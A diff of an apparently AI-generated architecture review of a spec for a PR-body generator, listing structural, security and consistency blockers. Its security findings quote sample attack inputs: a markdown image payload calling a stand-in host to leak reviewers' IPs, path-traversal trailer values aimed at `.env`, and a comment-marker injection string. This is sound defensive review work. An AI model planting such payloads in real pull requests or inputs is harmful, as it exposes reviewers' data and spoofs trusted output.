@@ -1,176 +1,173 @@
 ---
-date: 2026-08-12
+date: 2026-08-13
 spec: .context-index/specs/features/pr-review-brief/pr-body-composition.spec.md
 charter: .context-index/specs/features/pr-review-brief/charter.md
 verdict: BLOCK
 tier: full
-last-reviewed-revision: 2
-file-sha: 360ea2562668012c29e6a68e4a9343f3d12b1243c3467b308ec7f920ecf195fb
+last-reviewed-revision: 4
+file-sha: eab4e43cb731a2d5f891d28fcb371420909a6579aa26510830abe5c99ee157b6
 ---
 
 # Architecture Review: pr-body-composition
 
-> **Date:** 2026-08-12
-> **Spec:** `.context-index/specs/features/pr-review-brief/pr-body-composition.spec.md` (revision 2)
-> **Charter:** `.context-index/specs/features/pr-review-brief/charter.md`
-> **Rigor tier:** full (risk_level: medium → review_mode: full)
+> **Date:** 2026-08-13
+> **Spec:** `.context-index/specs/features/pr-review-brief/pr-body-composition.spec.md` (revision 4)
+> **Charter:** `.context-index/specs/features/pr-review-brief/charter.md` (revision 4, approved)
+> **Rigor tier:** `full` (risk_level `medium` → `risk-policies.yaml` `policies.medium.review_mode: full`; no `--tier` override, no routing signal)
 > **Verdict:** BLOCK
 
 ## Reviewers Dispatched
 
-| ID | Name | Mode | Profile | Prompt |
-|----|------|------|---------|--------|
+| ID | Name | Mode | Profile | Prompt/Skill |
+|----|------|------|---------|--------------|
 | structural-architect | Structural Architect | subagent | reviewer-reasoning | `plugin:review-specs/structural-architect-prompt.md` |
 | security-reviewer | Security Reviewer | subagent | reviewer-capable | `plugin:review-specs/security-reviewer-prompt.md` |
 | consistency-analyzer | Consistency Analyzer | subagent | reviewer-fast | `plugin:review-specs/consistency-analyzer-prompt.md` |
 
+Registry: domain `software` (source level `default`); `.context-index/governance/review.yaml` declares `reviewers: []`, so the three bundled defaults apply unmodified. No load warnings. No cross-repo `depends-on` references. Context pack `base` (`include: []`). Skill extensions: `__NONE__`. Module heuristics for `pr-review-brief`: 3 retrieved and injected.
+
+---
+
 ## Structural Architect (structural-architect)
 
-**Verdict:** BLOCK
+**Verdict:** BLOCK — 3 blockers, 2 warnings
 
-### SA-1 — blocker — Verification input has no defined contract, and its producer declares it unparseable
+### SA-1 — blocker
 
-- **blocker_id:** `structural-architect:undefined-input-contract:f0b5f0fb`
+- **blocker_id:** `structural-architect:incorrect-consumed-contract:3dfb3f0f`
+- **section_anchor:** `input-contracts`
+- **Location:** § Input Contracts → Routing entries, "Consumed shape" table
+- **Finding:** The spec states "the accessor returns the `{ version, entries[] }` envelope" and types every row as `entries[].*`. `readRoutingSidecar()` (`lib/plan-routing-sidecar.mjs:283-293`) returns `parseSidecarJson(body)`, which returns `doc.entries.slice().sort(...)` — a bare array (`:229-231`; JSDoc `@returns {object[]}` at `:278`). The envelope is consumed and discarded inside the module; `version` is never observable by a caller. `lookupRoutingEntry` confirms this by calling `.find()` directly on the return value (`:306`). An implementer following the table destructures a `{ version, entries }` object out of an array and gets `undefined` for both.
+- **Recommendation:** Restate the consumed shape as the array the accessor actually returns and drop `version` from the *consumed-shape* table — a field the consumer cannot observe is not a consumed contract. **The version check itself is real and must be preserved:** `parseSidecarJson` validates `doc.version !== SIDECAR_SCHEMA_VERSION` and raises `INVALID_SIDECAR_JSON` (`:216-221`), which is what the Degradation paragraph and AC-13 already pin. Move the version statement wholly into Degradation; do not weaken or delete AC-13.
+
+### SA-2 — blocker
+
+- **blocker_id:** `structural-architect:incomplete-task-map:6231f1c4`
 - **section_anchor:** `actionable-task-map`
-- **Location:** Actionable Task Map ("Verification summary reader"), Behaviors bullet 7, Error Cases row 5
+- **Location:** § Actionable Task Map, "Output encoder" row
+- **Finding:** The task reads "the **four** rules in Output Encoding Contract: path containment, table-cell safety, marker neutralization, stderr diagnostics" — that enumerates rules 2 through 5 and drops rule 1, line collapse. The contract states rule order is part of the contract and that line collapse must run first because every later rule reasons about "the start of the value." The task map is what `/adev:plan` decomposes, so the ordering-critical rule has no task carrying it even though AC-16 asserts its behavior.
+- **Recommendation:** Correct the count to five and name line collapse first in the task, preserving the ordering constraint the contract declares.
 
-The verification input is named only as "the `/adev:validate` report". No path convention (`<spec-stem>.validate.md` is never stated), no grammar for extracting `verdict` / `gates[]` / `check_results[]`, and no fallback ladder — while the sibling spec fixes an explicit grammar plus a five-rung ladder for its far simpler `## Parallelization` input. Worse, the input is a narrative, human-primary sidecar per ADR-0012 ("Naming convention": `.md` = human-primary narrative; machine-primary data is `.json` read through a CLI accessor), and `skills/validate/SKILL.md:405` states outright: *"Do NOT re-read or re-parse any prior `<spec-slug>.validate.md` file"* — validator outcomes are canonically `state.steps.validate` from the lifecycle projection. The spec contracts a consumer against an artifact its producer has declared non-authoritative and unparseable.
+### SA-3 — blocker
 
-**Recommendation:** Name the authoritative source of verification data and its typed shape (report path vs. lifecycle projection), state the field-level contract consumed, and give the degradation path when the source is absent or shape-invalid.
+- **blocker_id:** `structural-architect:adr-conflict:33a8b719`
+- **section_anchor:** `behaviors`
+- **Location:** § Behaviors, bullet 4 ("When a referenced spec has a `<spec-stem>.routing.json` sidecar…")
+- **Finding:** Behaviors keys the sidecar to the spec stem. `.context-index/adrs/0012-plan-adjacent-sidecar-artifacts.md` § "Permitted peers" defines it as `<plan-stem>.routing.json`; the charter's Consumed APIs row says the same ("keyed to the plan stem, not the spec stem, per ADR-0012"); and this spec's own § Routing entries mandates the `.spec.md`→`.plan.md` derivation through `sidecarPathFor()`. Behaviors is normative, so two normative sections of one spec now specify different path derivations. The spec itself notes the stems coincide in this repo today — the condition under which this ships unnoticed.
+- **Recommendation:** Restate Behaviors bullet 4 in plan-stem terms. Additionally, no acceptance criterion pins the derivation (AC-12 asserts only that no local parser exists, AC-13 only the schema-mismatch path); adding one that exercises a spec stem differing from its plan stem is what prevents the shorthand from recurring.
 
-### SA-2 — blocker — The `UNKNOWN` invariant is unimplementable as written
+### SA-4 — warning
 
-- **blocker_id:** `structural-architect:ambiguous-behavior:c574011a`
-- **section_anchor:** `behaviors-5`
-- **Location:** Behaviors bullet 5, Acceptance Criteria 3, Task Map ("Attention map ranking")
+- **Location:** § Input Contracts → Routing entries, "Degradation"; § Error Cases, `readRoutingSidecar()` row
+- **Finding:** Both enumerate `INVALID_PLAN_PATH`, `INVALID_SIDECAR_JSON`, and "a read error," and describe absence in prose only. The absent case throws a distinct named code, `ROUTING_SIDECAR_MISSING` (`lib/plan-routing-sidecar.mjs:286-289`), which is the dominant path in a repo the charter says carries ~20 legacy plans with no sidecar. The contract requires annotating the section with "the thrown code," so the most frequently rendered code is the one the spec never names.
+- **Recommendation:** Name `ROUTING_SIDECAR_MISSING` in both enumerations. See cross-finding note 2 — this and SEC-2 have one shared fix.
 
-"*When a task appears in the changed files but has no corresponding routing entry*" presupposes a task→file mapping that no declared input provides. `routing.json` entries carry `task_id`, `selected_agent`, `scores`, `rationale` only — no `files[]` (the charter's Attention Entry lists `files[]`, but the sidecar on disk has none, e.g. `.context-index/specs/cross-cutting/review-block-auto-retry.routing.json`). Nor does the spec say the task universe comes from `Plan-task:` trailers, the plan's `## Task Summary`, or elsewhere. The charter's strongest invariant — "absence of data is never presented as absence of risk" — is therefore unimplementable and untestable against AC-3.
+### SA-5 — warning
 
-**Recommendation:** Declare the authoritative enumeration of tasks in range and the derivation of each task's file set, so `UNKNOWN` has a defined domain.
+- **Location:** § Input Contracts → Verification, stale-revision rule
+- **Finding:** The rule assumes `byRevision[N]` keys mean "validation ran against revision N." `effectiveRevision()` in `lib/lifecycle-state.mjs:1312-1325` folds any event lacking an integer `revision:` into bucket 1 (documented at `:1302-1306` as legacy-fold-as-rev-1). A spec at `revision: 1` with legacy validate events therefore renders a verdict of unknown provenance as *current* — exactly the failure the stale-revision rule exists to prevent. For specs above revision 1, the same fold over-reports staleness.
+- **Recommendation:** State how a legacy-folded `byRevision[1]` bucket is distinguished from a verdict genuinely recorded against revision 1, or declare it out of contract explicitly.
 
-### SA-3 — warning — Routing sidecar field path and sort direction are both wrong
+**Not flagged (verified sound):** § Section ownership and marker assembly are unambiguous and agree with `pr-body-advisories.spec.md` § Section Placement. § Referenced spec frontmatter correctly declares the fourth input — `currentState()` returns a projection carrying no spec revision (verified at `lib/lifecycle-state.mjs:1277-1294`, `:1401`). The sorted-entries and stable-sort tie-break claims are accurate against `lib/plan-routing-sidecar.mjs:231`. Dependency direction and the `cli-driver-surface` boundary are respected.
 
-`blast_radius` is nested under `scores` and normalized `0..1` (`skills/route/SKILL.md:156`), not a top-level field. *Ascending* `blast_radius` orders smallest blast radius first, inverting the section's stated purpose. Direct `entries[]` parsing also duplicates schema knowledge held by `lib/plan-routing-sidecar.mjs` / `adev route render-sidecar`, which ADR-0012 designates as the accessor.
-
-**Recommendation:** Pin the field path and sort direction; state whether the sidecar is read directly or through the owning module's accessor.
-
-### SA-4 — warning — Verification Summary cardinality conflicts with the charter
-
-The charter states a PR Brief contains "at most one Verification Summary", but the spec reads a report *per referenced spec*, yielding N. The aggregation rule is unspecified.
-
-### SA-5 — warning — Revision-2 residue in the Markdown renderer task
-
-The renderer task still reads "Emit the **three** sections inside the marker, in fixed order" — the wording revision 2 was meant to replace. No acceptance criterion pins the five-slot order from this side, and ownership of the outer marker wrap is split between the two specs without statement.
-
-### SA-6 — warning — Empty-range behavior contradicts the sibling spec
-
-This spec says an empty range emits "a brief stating the range is empty" (section list apparently replaced); the sibling says both of its sections "render as the empty-range statement `pr-body-composition` already defines" (five sections still rendered). Two readings, two outputs.
-
-### SA-7 — warning — Manifest precondition has no error case and contradicts the exit-code postcondition
-
-A readable `manifest.yaml` is a hard precondition, yet no error case covers its absence and the postcondition promises exit 0 "whenever `HEAD` and the base ref resolve". Behavior in an adev-less checkout is undefined. The Trailer reader also hardcodes trailer names despite the precondition citing the manifest as their source.
-
-### SA-8 — suggestion — No `--head` argument exists despite determinism being specified over a `(base, head)` pair
-
-The charter's PR Brief entity carries `head_ref`, but no `--head` argument exists and "the repository's default branch" has no stated resolution rule, so `NO_MERGE_BASE` has no defined trigger.
-
-### SA-9 — suggestion — The interlock obligation is invisible from the side that can violate it
-
-`review-packet-template.spec.md` AC-6 asserts an interlock over *this verb's* output; this spec carries no matching constraint.
-
-> Data flow is otherwise traceable and one-directional (git + on-disk artifacts → stdout); the read-only/no-forge postconditions are crisp, and the escaping and determinism invariants are well specified.
+---
 
 ## Security Reviewer (security-reviewer)
 
-**Verdict:** BLOCK
+**Verdict:** BLOCK — 2 blockers, 1 warning, 1 suggestion
 
-**Threat model applied:** attacker = any commit author (trailer values are attacker-influenceable per `issue-582`), victim = the human reviewer who trusts the generated brief, channel = stdout markdown that `cicd` posts into a public PR body.
+**Cited precedent verified.** The quote of `renderRoutingMarkdown` (`.replace(/\|/g, "\\|").replace(/\n+/g, " ")`) is byte-accurate against `lib/plan-routing-sidecar.mjs:343`. The precedent's `/\n+/g` would not catch a bare `\r`; the spec's rule 1 explicitly widens to `\n`, `\r`, and `\r\n`, so it does not overclaim the precedent's coverage. No defect in rule 1 as written.
 
-### SEC-1 — blocker — Path traversal via the `Spec:` trailer value
+### SEC-1 — blocker — input-validation
 
-- **blocker_id:** `security-reviewer:path-traversal:73f48d94`
-- **section_anchor:** `error-cases`
-- **Category:** input-validation
+- **blocker_id:** `security-reviewer:input-validation:2d90002f`
+- **section_anchor:** `output-encoding-contract`
+- **Finding:** The Output Encoding Contract (rule 1 line collapse, rule 2 path containment, rule 3 table-cell `|`/`#`/`-`/`>` neutralization, rule 4 `<!--`/`-->` neutralization) never neutralizes markdown link/image syntax (`[`, `]`, `(`, `)`, `!`). `entries[].rationale` is explicitly named "Attacker-influenceable" and is rendered as free text into a table cell. A crafted rationale such as `![](https://evil.example/t?x=1)` passes all rules unchanged — no `|`, no leading block character, no comment delimiter — and GitHub renders it as a live `<img>` in the public PR body, firing an outbound request that leaks the viewing reviewer's IP and user-agent and confirms when the PR was read. This is a passive tracking-pixel exfiltration channel. The same gap applies to every free-text value the encoder touches, and to the sibling `pr-body-advisories.spec.md`, which explicitly delegates all escaping to this same encoder ("passes through the single encoder defined in `pr-body-composition.spec.md` § Output Encoding Contract").
+- **Recommendation:** Neutralize markdown link/image construction at the same interpolation boundary — escape `[` and `]`, and any `!` immediately preceding `[`, or break the `](` sequence. **Insert it before table-cell safety rather than appending it as "a fifth rule"** — the contract already has five rules and rule 5 is Diagnostics; appending collides with the renumbering SA-2 requires. CWE-116.
 
-The `Spec:` trailer's path value is used directly for filesystem lookups (locating `.routing.json`, the validate report, and the existence check) with no stated containment or canonicalization rule. A crafted `Spec: ../../../../.env` is only handled by the "path does not exist" branch if it happens not to resolve; the spec never requires verifying the resolved path stays under `.context-index/specs/`.
+### SEC-2 — blocker — rate-limiting (availability)
 
-**Failure scenario:** A contributor commits `Spec: ../../.env`. If a file exists there, the existence check and any downstream parse attempt read outside the lifecycle-artifact tree, and error text built from "the offending path" leaks whether sensitive local files exist — or their content if they are JSON-shaped.
+- **blocker_id:** `security-reviewer:rate-limiting:70d813a6`
+- **section_anchor:** `input-contracts`
+- **Finding:** `readRoutingSidecar()` can throw `INVALID_ROUTING_ENTRY`, not only the codes the spec enumerates: `parseSidecarJson` calls `validateEntry` on every entry at **read** time (`lib/plan-routing-sidecar.mjs:228`), so `rationale.length > MAX_RATIONALE_LEN` (400), a non-string `rationale`, a missing `scores` dimension, or an out-of-range score each throw `INVALID_ROUTING_ENTRY`. The spec's Degradation clause and the Error Cases table enumerate only `INVALID_PLAN_PATH`, `INVALID_SIDECAR_JSON`, and "a read error." An implementer following the literal enumeration writes a code-by-code catch and the throw escapes, contradicting the Behavioral Contract ("never blocks… degrade to explicit gaps… rather than to a non-zero exit") and the postcondition "Exit code is 0 whenever `HEAD` and the base ref resolve." Because `rationale` is attacker-influenceable and the cap is enforced on read, a committed sidecar with an oversized entry crashes the generator in CI.
+- **Recommendation:** Widen the degradation clause to **"any throw from `readRoutingSidecar()`"** — a catch-all around the call site, not a code-by-code switch — and say the annotation renders whatever `err.code` was thrown. This single change also resolves SA-4 and stops rev 5 from enumerating codes a third time and missing a fourth. CWE-1284 / availability.
 
-**Recommendation:** Resolve every `Spec:`-derived path with `path.resolve`, then require it to start with the canonicalized `.context-index/specs/` root before any `fs.stat` / `fs.readFile`. Treat an escaping path identically to "does not exist on disk". CWE-22. Add an acceptance criterion and a test with a `../` trailer value.
+### SEC-3 — warning — input-validation
 
-### SEC-2 — blocker — Escaping contract omits the markdown table delimiter and covers only trailers
+- **Finding:** Rule 3 neutralizes `|` and leading block characters, but no rule strips other C0 control characters (`\x1b` ANSI escape, `\x07`, `\v`, `\f`). GitHub's web renderer is unaffected, but `adev pr body` output is also consumed by `cicd` and plausibly piped to a terminal (`gh pr view`, local diffing) by a human reviewer, where an attacker-controlled rationale carrying ANSI escapes can hide or spoof text.
+- **Recommendation:** Extend rule 1 (or add a rule 1b) to replace all C0 control characters other than the already-handled `\n`/`\r` at the same interpolation boundary.
 
-- **blocker_id:** `security-reviewer:input-validation:7b64a50b`
-- **section_anchor:** `behaviors`
-- **Category:** input-validation
+### SEC-4 — suggestion — rate-limiting
 
-The escaping requirement is scoped to `Spec:` trailers and enumerates `]`, `,`, newline, backtick — but the attention map's `rationale` is specified to be "reproduced verbatim", and neither list mentions `|` (the table cell delimiter) or leading `#`/`-`/`>`. Every generated section renders as a table.
+- **Finding:** No input-size bound is specified for the commit range itself — commit count, distinct-task count, or per-task file-set size (`git diff-tree --name-only` output is unbounded). A very large PR could produce unbounded time and an unbounded generated body, unlike the sibling spec's explicit per-value cap.
+- **Recommendation:** State an explicit ceiling (e.g. cap rendered rows per section with a `+N more` line), or record the CI job's own timeout as the accepted mitigation so the gap is a documented tradeoff.
 
-**Failure scenario:** A rationale of `"skip review | Verdict: PASS"` — plausible without malice, since `/adev:route` rationale is free text — renders extra columns, displacing or spoofing the cells a reviewer relies on to gauge risk.
+**Not flagged:** no authentication or authorization findings — this is a local read-only CLI verb whose postconditions forbid network and forge calls, so auth is correctly out of scope. No secrets-handling findings; the spec references no credentials.
 
-**Recommendation:** Extend the single escaping routine to every value interpolated into a table cell, explicitly including `\|` and neutralized leading structural characters, and apply it to `rationale`: replace "reproduced verbatim" with "reproduced verbatim content, escaped for table-cell safety." CWE-116.
-
-### SEC-3 — blocker — Marker strings are not neutralized in reflected values
-
-- **blocker_id:** `security-reviewer:data-exposure:b4905e27`
-- **section_anchor:** `postconditions`
-- **Category:** data-exposure
-
-No rendered value is required to be checked for the literal strings `<!--` / `-->`. The system's central integrity invariant — "exactly one opening and one closing marker", "never interleaved with author-written text" — depends entirely on those literals appearing nowhere else.
-
-**Failure scenario:** A trailer or rationale containing the literal `<!-- /adev:pr-brief -->` produces a second closing-marker-shaped string. Downstream `cicd` delivery (boundary-based replace) or the template interlock test then misidentifies the true closing marker, letting attacker-controlled content masquerade as outside the generated block — defeating the authorship boundary this module exists to enforce.
-
-**Recommendation:** Require HTML-comment delimiter neutralization in the same escaping pass as SEC-2, plus an acceptance criterion asserting exactly one literal occurrence of each marker string even when a field contains that literal text.
-
-### SEC-4 — suggestion — Diagnostics do not specify stream or path form
-
-Error cases name "the working directory" or "the offending path" without specifying stdout vs. stderr, or relative vs. absolute. An absolute path leaks local filesystem structure (CI runner home directory, username).
-
-**Recommendation:** State that diagnostics go to stderr and render paths relative to the repository root.
-
-### SEC-5 — suggestion — Routing data is self-attested by the same author
-
-The attention map's risk ranking comes entirely from a repo-tracked file the same author who wrote the risky change can edit in the same PR. The spec treats routing data as untrusted for *parsing* but not for *content*.
-
-**Recommendation:** Out of scope for this spec (routing integrity is `/adev:route`'s concern), but consider noting when a sidecar's mtime is newer than its owning spec's validate report, as a cheap staleness signal.
-
-> **Not flagged (explicitly handled):** shell / `node -e` interpolation of trailers, forge network calls, and traditional auth/authz/rate-limiting (correctly out of scope for a local read-only CLI verb).
+---
 
 ## Consistency Analyzer (consistency-analyzer)
 
-**Verdict:** PASS_WITH_NOTES
+**Verdict:** BLOCK — 1 blocker, 1 warning, 1 suggestion
 
-**Headline check:** the five-slot section table in this spec (§Section ownership) and in `pr-body-advisories.spec.md` (§Section Placement) are **identical** in section names, order, and owning-spec assignment. No leftover revision-1 wording contradicts it — the old "fixed at three sections" language is explicitly called out and superseded. Both marker invariants apply uniformly across all five slots.
+### CON-1 — blocker — contract
 
-### CON-1 — warning — pattern — Validate report gets no grammar while the sibling's simpler input gets a full ladder
+- **blocker_id:** `consistency-analyzer:contract:1a299478`
+- **section_anchor:** `behaviors`
+- **This Spec:** § Input Contracts → Routing entries: "ADR-0012 § 'Permitted peers' defines the sidecar as `<plan-stem>.routing.json`. This spec starts from a `Spec:` trailer, so the derivation is explicit: `<spec-path>` with the `.spec.md` suffix replaced by `.plan.md`, passed to `sidecarPathFor()`."
+- **Conflicts With:** § Behaviors, bullet 4: "**When** a referenced spec has a `<spec-stem>.routing.json` sidecar **then** its entries populate the attention map…" — and `.context-index/adrs/0012-plan-adjacent-sidecar-artifacts.md` § "Permitted peers", and `charter.md` § Interface Contracts → Consumed APIs.
+- **Failure scenario:** an implementation following Behaviors derives the sidecar from the spec stem; wherever a spec stem and its plan stem differ, no routing entry is ever found and every task renders `UNKNOWN` despite a valid sidecar existing on disk.
+- **Recommendation:** Change Behaviors bullet 4 to `<plan-stem>.routing.json`. **Same underlying defect as SA-3** — one edit closes both.
 
-**This spec:** treats the `/adev:validate` report as parseable for verdict, gates, and check results with no grammar defining what counts as parseable.
+### CON-2 — warning — contract
 
-**Conflicts with:** `pr-body-advisories.spec.md` §"Reading Order: Input Grammar and Fallback Ladder", which gives an equally free-form input a fixed grammar and five-rung ladder precisely because "a parser that guesses at malformed input produces a confidently wrong result, which is worse than none." Sampled `.validate.md` files show non-uniform heading format (`## Check 1: Quality Gates` with and without a `— VERDICT` suffix), and no cross-cutting spec defines a `.validate.md` schema the way `plan-routing-sidecar.spec.md` defines `.routing.json`.
+- **This Spec:** § Behaviors: "**When** any interpolated value contains `|`, a leading block character, `<!--`, `-->`, or **shell metacharacters** **then** it is encoded per the Output Encoding Contract…"
+- **Conflicts With:** § Output Encoding Contract, rules 1–5, none of which define shell-metacharacter handling (`$`, backtick, `\`, `;`).
+- **Recommendation:** Prefer removing "shell metacharacters" from the Behaviors condition — the real constraint is the Task Map's "consuming values as data (never interpolated into a shell or `node -e` context)", which is a *non-interpolation* rule, not an *encoding* rule. Alternatively add an explicit rule. Leaving the term in the Behaviors condition with no matching rule invites an implementer to invent one.
 
-**Recommendation:** Adopt the same grammar + ladder + named degradation treatment, or document why verdict extraction needs none (e.g. if it only reads the `## Overall Verdict: **X**` line).
+### CON-3 — suggestion — terminology
 
-### CON-2 — warning — contract — `Author-type:` and `Operator:` are consumed by the charter but used nowhere
+- **This Spec:** § Input Contracts declares `entries[].scores.novelty` as a consumed field, but no ranking, rendering, or acceptance criterion uses it (Task Map "Attention map ranking", Behaviors bullet 4, and AC-5 all sort on `selected_agent` then `scores.blast_radius` only).
+- **Conflicts With:** `charter.md` § Domain Model lists `novelty` as a key attribute of Attention Entry.
+- **Recommendation:** Either state how `novelty` is rendered or used as a secondary key, or drop it from Input Contracts so the consumed set matches what is actually consumed.
 
-**This spec:** the Trailer reader reads `Author-type:`, but no Behavior, AC, or Postcondition uses it; `Operator:` is never read at all.
+**Verified consistent:** the § Section ownership table matches `pr-body-advisories.spec.md` § Section Placement exactly on slot list, order, and owners. The file naming complies with `.context-index/specs/cross-cutting/spec-file-suffixes.spec.md`.
 
-**Conflicts with:** `charter.md` §Interface Contracts → Consumed APIs, which states this module consumes all four trailers. The charter's own Traceability Row attributes also omit both, so the gap traces to an internal charter inconsistency this spec neither resolves nor flags.
+---
 
-**Recommendation:** Wire them into a rendered field, or narrow the charter's Consumed APIs row with a recorded deferral.
+## Cross-finding notes
 
-### CON-3 — suggestion — terminology — `blast_radius` is written as a top-level field
+These govern how revision 5 should be written; they are not additional findings.
 
-The real sidecar schema nests it as `entries[].scores.blast_radius`. The charter flattens it the same way, so this is charter-aligned but schema-imprecise. A one-word fix removes the ambiguity.
+1. **SA-3 and CON-1 are the same defect** — § Behaviors bullet 4's `<spec-stem>.routing.json`. Two reviewers found it independently, so it carries two distinct `blocker_id`s and appears as two entries in the `.blockers.md` sidecar. Patch that line once; both clear together.
+2. **SA-4 (warning) and SEC-2 (blocker) share one fix** — widen the `readRoutingSidecar()` degradation clause to "any throw," rather than enumerating codes a third time. Enumeration has now missed `ROUTING_SIDECAR_MISSING` and `INVALID_ROUTING_ENTRY` across two revisions.
+3. **SEC-1's fix must not append a rule.** The contract has five rules and rule 5 is Diagnostics; the markdown-link rule belongs before table-cell safety. SA-2's renumbering fix and SEC-1's insertion must be applied together or they contradict each other.
+4. **SA-1 must not weaken AC-13.** The `version` check is real inside `parseSidecarJson`; only the claim that a *caller* observes it is wrong.
+
+## Revision-3 blocker disposition
+
+All three revision-3 blockers are **addressed**; none recurs. Independently confirmed against source rather than assumed:
+
+| Revision-3 blocker | Status | Evidence |
+|---|---|---|
+| `structural-architect:module-boundary-violation:8f8edfe8` | addressed | § Routing entries now mandates `lib/plan-routing-sidecar.mjs`; AC-12 forbids a local parser. The accessor's exports, `INVALID_PLAN_PATH` guard, and `task_id`-ascending sort were verified against source. |
+| `structural-architect:undeclared-input:73288079` | addressed | § Referenced spec frontmatter declares the fourth input; `currentState()` verified to expose no spec revision (`lib/lifecycle-state.mjs:1277-1294`). |
+| `security-reviewer:input-validation:7f5c8554` | addressed | Rule 1 line collapse added and ordered first; the cited `renderRoutingMarkdown` precedent verified byte-accurate. |
+
+Every blocker in this round is **new**. Three of the six (SA-1, SA-2, SA-3/CON-1) are direct artifacts of the hand-edit that produced revision 4 — a consumed-shape table written from the module's file-format docblock rather than its return value, a rule count not propagated into the Task Map, and a path convention corrected in one section but not the other. The remaining two (SEC-1, SEC-2) are pre-existing gaps this round reached for the first time.
 
 ---
 
 ## Summary
 
-**Total findings:** 17 (5 blockers, 8 warnings, 4 suggestions)
+**Total findings:** 11 (6 blockers, 4 warnings, 2 suggestions — SA-3 and CON-1 are one underlying defect)
 
-**Action required:** Revise the spec to address the five blockers, then re-review. The blockers cluster into two themes:
+| Reviewer | Verdict | Blockers | Warnings | Suggestions |
+|---|---|---|---|---|
+| structural-architect | BLOCK | 3 | 2 | 0 |
+| security-reviewer | BLOCK | 2 | 1 | 1 |
+| consistency-analyzer | BLOCK | 1 | 1 | 1 |
 
-1. **Undefined input contracts** (SA-1, SA-2) — the verification and task-enumeration inputs are named but never given a shape, a source of truth, or a degradation path. SA-1 is the more serious: the spec consumes an artifact whose producer explicitly forbids re-parsing.
-2. **Output escaping is under-specified for the actual threat** (SEC-1, SEC-2, SEC-3) — path containment for trailer-derived paths, table-cell escaping for all interpolated values including `rationale`, and marker-literal neutralization. SEC-3 undermines the authorship boundary that is this module's reason to exist.
+**Action required:** Revise the spec to revision 5 addressing the six blockers, then re-review. Blocker entries with canonical `blocker_id` and `section_anchor` are in `pr-body-composition.blockers.md`. Five distinct edits close all six: (1) correct the consumed-shape table in § Routing entries without weakening AC-13; (2) fix the rule count and name line collapse in the Task Map "Output encoder" row; (3) change § Behaviors bullet 4 to `<plan-stem>.routing.json` and add an acceptance criterion pinning the derivation; (4) insert markdown-link/image neutralization before table-cell safety; (5) widen the `readRoutingSidecar()` degradation clause to any throw.
 
-Run `/adev:specify --revise .context-index/specs/features/pr-review-brief/pr-body-composition.spec.md` to produce revision 3, then re-review.
+**Governance:** `.context-index/governance/gates.yaml` declares no `approver_role` on a `spec-to-plan` transition, so no additional approver is required beyond this gate.
